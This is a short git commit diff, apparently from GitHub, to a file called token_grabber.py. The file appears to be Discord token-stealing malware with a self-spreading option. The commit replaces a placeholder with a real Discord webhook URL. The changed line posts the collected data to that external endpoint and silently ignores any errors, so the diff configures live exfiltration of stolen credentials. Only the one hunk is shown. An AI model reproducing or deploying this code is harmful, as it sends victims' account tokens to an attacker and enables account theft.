ee0c76c7614a32c36d17928e1cfcf0eef7a2809e
hgjk76 <97763542+hgjk76@users.noreply.github.com>
2022-01-14 14:55:25 -0600

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/931651842960666724/QsT-0LsA-GR_4qvJnUfVkhbS7iKBW1a22WZmIhAu_t3dXFNGksIxAq8A2ev06zxRIFim", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
